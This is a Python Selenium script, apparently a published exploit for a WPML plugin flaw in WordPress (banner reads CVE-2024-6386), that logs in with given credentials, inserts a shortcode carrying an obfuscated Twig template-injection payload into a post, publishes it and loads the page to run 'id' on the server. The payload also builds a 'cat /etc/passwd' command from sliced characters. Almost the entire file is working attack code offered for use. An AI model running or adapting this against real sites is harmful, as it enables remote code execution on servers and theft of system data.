from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
import time, sys
from termcolor import colored

intro = r"""  ______     _______     ____   ___ ____  _  _          __  _____  ___   __   
 / ___\ \   / / ____|   |___ \ / _ \___ \| || |        / /_|___ / ( _ ) / /_  
| |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____| '_ \ |_ \ / _ \| '_ \ 
| |___  \ V / | |__|_____/ __/| |_| / __/|__   _|_____| (_) |__) | (_) | (_) |
 \____|  \_/  |_____|_  |_____|\___/_____|  |_|        \___/____/ \___/ \___/ 
 _ __ ___   __ _  __| | ___  | |__  _   _                                     
| '_ ` _ \ / _` |/ _` |/ _ \ | '_ \| | | |                                    
| | | | | | (_| | (_| |  __/ | |_) | |_| |                                    
|_| |_| |_|\__,_|\__,_|\___| |_.__/ \__, |                                    
   ____                             |___/                                     
  / __ \  __ _ _ __ __ _  ___ _ __   __| | ___                                
 / / _` |/ _` | '__/ _` |/ _ \ '_ \ / _` |/ _ \                               
| | (_| | (_| | | | (_| |  __/ | | | (_| | (_) |                              
 \ \__,_|\__,_|_|  \__, |\___|_| |_|\__,_|\___/                               
  \____/           |___/                                                      
"""
print(colored(intro+"\n", "red"))
print(colored("https://t.me/iamargendo\n\n", "green"))
print(colored("Example of hostname: https://vulnerable-host.com:443", "cyan"))
host = str(input(colored("Enter hostname to check: ", "cyan")))
login = str(input(colored("Enter WordPress login: ", "cyan")))
password = str(input(colored("Enter WordPress password: ", "cyan")))
post_id = "1"

# wp login
def wordpress_login(driver, username, password, login_url):
    # open login form
    driver.get(login_url)

    # insert data to form
    login_input = driver.find_element(By.ID, "user_login")
    login_input.send_keys(username)
    password_input = driver.find_element(By.ID, "user_pass")
    password_input.send_keys(password)

    # click button to login
    login_button = driver.find_element(By.ID, "wp-submit")
    login_button.click()

    # pause to load page
    time.sleep(3)

    # check auth status
    if "wp-admin" in driver.current_url:
        print(colored("Authentication successful!", "green"))
    else:
        #raise Exception(colored("Authentication failed. Check your login and password.", "red"))
        print(colored("Authentication failed. Check your login and password.", "red"))
        sys.exit()

# insert payload 
def payload_insert(driver, post_edit_url):
    # go to post edit page
    driver.get(post_edit_url)
    time.sleep(3)

    # add shortcode block
    add_button = driver.find_element(By.ID, ":r1:")
    add_button.click()
    time.sleep(1)

    shortcode_button = driver.find_element(By.CLASS_NAME, "editor-block-list-item-shortcode")
    shortcode_button.click()
    time.sleep(2)

    # input payload
    shortcode_input = driver.find_element(By.CLASS_NAME, "blocks-shortcode__textarea")
    ssti_payload = """[wpml_language_switcher]\n{% set sp = css_classes|slice(33,1) %}\n{% set a = css_classes|slice(10,1) %}\n{% set c = css_classes|slice(13,1) %}\n{% set i = css_classes|slice(12,1) %}\n{% set d = css_classes|slice(23,1) %}\n{% set s = css_classes|slice(6,1) %}\n{% set y = languages|join|slice(4,1) %}\n{% set t = css_classes|slice(9,1) %}\n{% set e = css_classes|slice(24,1) %}\n{% set m = css_classes|slice(2,1) %}\n{% set p = css_classes|slice(1,1) %}\n{% set w = css_classes|slice(0,1) %}\n{% set system = s~y~s~t~e~m %}\n{% set pwd = p~w~d %}\n{% set cat = c~a~t %}\n{% set sl = [pwd]|map(system)|join|slice(0,1) %}\n{% set id = i~d %}\n{% set passwd = c~a~t~sp~sl~e~t~c~sl~p~a~s~s~w~d %}\n{{[id]|map(system)|join}}\n[/wpml_language_switcher]"""
    shortcode_input.clear()
    shortcode_input.send_keys(ssti_payload)
    
    # publish post
    publish_button = driver.find_element(By.CLASS_NAME, "editor-post-publish-button__button")
    publish_button.click()
    time.sleep(2)
    
    # submit publish post
    submit_publish_button = driver.find_element(By.CLASS_NAME, "editor-post-publish-button")
    submit_publish_button.click()
    print(colored("Payload uploaded successfully!", "green"))

def out_res(out_url):
    driver.get(out_url)
    time.sleep(10)
    

driver = webdriver.Chrome()

# url for login
login_url = f"{host}/wp-login.php"

# auth
wordpress_login(driver, login, password, login_url)

# url to create a post
post_edit_url = f"{host}/wp-admin/post.php?post={post_id}&action=edit"
res_url = f"{host}/?p={post_id}"

payload_insert(driver, post_edit_url)
out_res(res_url)

# exit browser
driver.quit()

